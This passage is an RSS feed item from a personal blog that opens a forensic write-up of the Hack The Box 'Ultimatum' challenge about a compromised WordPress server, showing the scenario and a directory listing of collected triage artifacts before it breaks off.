<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss">
  <channel>
    <title>Linux on Shakil&#39;s Blog</title>
    <link>http://localhost:1313/tags/linux/</link>
    <description>Recent content in Linux on Shakil&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>Shakil Hossain - All Right Reserved.</copyright>
    <lastBuildDate>Mon, 27 May 2024 13:25:02 +0200</lastBuildDate><atom:link href="http://localhost:1313/tags/linux/index.xml" rel="self" type="application/rss+xml" /><icon>http://localhost:1313/logo.svg</icon>
    
    
    <item>
      <title>HTB Sherlock Ultimatum</title>
      <link>http://localhost:1313/posts/htb-sherlocks/ultimatum/</link>
      <pubDate>Mon, 27 May 2024 13:25:02 +0200</pubDate>
      
      <guid>http://localhost:1313/posts/htb-sherlocks/ultimatum/</guid>
      <description><![CDATA[<h1 id="ultimatum-dfirhttpsapphacktheboxcomsherlocksultimatum"><a href="https://app.hackthebox.com/sherlocks/Ultimatum">Ultimatum (DFIR)</a></h1>
<h2 id="scenario">Scenario</h2>
<p>One of the Forela WordPress servers was a target of notorious Threat Actors (TA). The website was running a blog dedicated to the Forela Social Club, where Forela employees can chat and discuss random topics. Unfortunately, it became a target of a threat group. The SOC team believes this was due to the blog running a vulnerable plugin. The IT admin already followed the acquisition playbook and triaged the server for the security team. Ultimately (no pun intended) it is your responsibility to investigate the incident. Step in and confirm the culprits behind the attack and restore this important service within the Forela environment.</p>
<h2 id="forensics">Forensics</h2>
<h3 id="artifacts">Artifacts</h3>
<p>We are given an archive <code>ultimatum.zip</code> with a <code>sha256sum:101ae8258f9a2a821bdc78e4f2b61deb2337cffb95e58c4dfe8cd4e57ca75a66</code>.</p>
<p>Upon extracting the archive use <a href="https://github.com/WithSecureLabs/LinuxCatScale/blob/master/Extract-Cat-Scale.sh">Extract-Cat-Scale.sh</a> we get the following artifacts:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">1732</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>console<span style="color:#ff79c6">-</span>error<span style="color:#ff79c6">-</span><span style="color:#8be9fd;font-style:italic">log</span><span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Docker:
</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Logs:
</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">488</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">451801</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>last<span style="color:#ff79c6">-</span>btmp<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">329</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>last<span style="color:#ff79c6">-</span>utmp<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">606</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>last<span style="color:#ff79c6">-</span>utmpdump<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">732</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>last<span style="color:#ff79c6">-</span>wtmp<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">2397</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>lastlog<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">396</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>passwd<span style="color:#ff79c6">-</span>check<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root     <span style="color:#bd93f9">12</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span><span style="color:#ff79c6">var</span><span style="color:#ff79c6">-</span>crash<span style="color:#ff79c6">-</span>list<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">115</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span><span style="color:#ff79c6">var</span><span style="color:#ff79c6">-</span>crash<span style="color:#ff79c6">.</span>tar<span style="color:#ff79c6">.</span>gz
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">2975</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span><span style="color:#ff79c6">var</span><span style="color:#ff79c6">-</span><span style="color:#8be9fd;font-style:italic">log</span><span style="color:#ff79c6">-</span>list<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">291</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>who<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">360</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>whoandwhat<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span>drwxrwxrwx <span style="color:#bd93f9">12</span> root root   <span style="color:#bd93f9">4096</span> May <span style="color:#bd93f9">27</span> <span style="color:#bd93f9">10</span>:<span style="color:#bd93f9">10</span> varlogs
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Misc:
</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">74804</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root      <span style="color:#bd93f9">559</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>Setuid<span style="color:#ff79c6">-</span>Setguid<span style="color:#ff79c6">-</span>tools<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root       <span style="color:#bd93f9">62</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>dev<span style="color:#ff79c6">-</span>dir<span style="color:#ff79c6">-</span>files<span style="color:#ff79c6">-</span>hashes<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root       <span style="color:#bd93f9">92</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>dev<span style="color:#ff79c6">-</span>dir<span style="color:#ff79c6">-</span>files<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">384887</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>exec<span style="color:#ff79c6">-</span>perm<span style="color:#ff79c6">-</span>files<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">34211795</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>full<span style="color:#ff79c6">-</span>timeline<span style="color:#ff79c6">.</span>csv
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">41585177</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>pot<span style="color:#ff79c6">-</span>webshell<span style="color:#ff79c6">-</span>first<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1000.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">392840</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>pot<span style="color:#ff79c6">-</span>webshell<span style="color:#ff79c6">-</span>hashes<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Persistence:
</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">116</span>
</span></span><span style="display:flex;"><span>drwxrwxrwx <span style="color:#bd93f9">2</span> root root  <span style="color:#bd93f9">4096</span> May <span style="color:#bd93f9">27</span> <span style="color:#bd93f9">10</span>:<span style="color:#bd93f9">10</span> crontabs
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">120</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>cron<span style="color:#ff79c6">-</span>folder<span style="color:#ff79c6">-</span>list<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">147</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>cron<span style="color:#ff79c6">-</span>tab<span style="color:#ff79c6">-</span>list<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">45449</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>persistence<span style="color:#ff79c6">-</span>systemdlist<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">775</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>service_status<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">27513</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>systemctl_all<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">23761</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>systemctl_service_status<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Podman:
</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Process_and_Network:
</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">5008</span>
</span></span><span style="display:flex;"><span>drwxrwxrwx <span style="color:#bd93f9">3</span> root root    <span style="color:#bd93f9">4096</span> May <span style="color:#bd93f9">27</span> <span style="color:#bd93f9">10</span>:<span style="color:#bd93f9">10</span> cyberjunkie_admin
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root     <span style="color:#bd93f9">671</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>ip<span style="color:#ff79c6">-</span>a<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root     <span style="color:#bd93f9">439</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>iptables<span style="color:#ff79c6">-</span>numerical<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root     <span style="color:#bd93f9">275</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>iptables<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root       <span style="color:#bd93f9">0</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>lsof<span style="color:#ff79c6">-</span>list<span style="color:#ff79c6">-</span>open<span style="color:#ff79c6">-</span>files<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">5474</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>process<span style="color:#ff79c6">-</span>cmdline<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root  <span style="color:#bd93f9">148446</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>process<span style="color:#ff79c6">-</span>details<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">28377</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>process<span style="color:#ff79c6">-</span>environment<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">11080</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>process<span style="color:#ff79c6">-</span>exe<span style="color:#ff79c6">-</span>links<span style="color:#ff79c6">.</span>txt
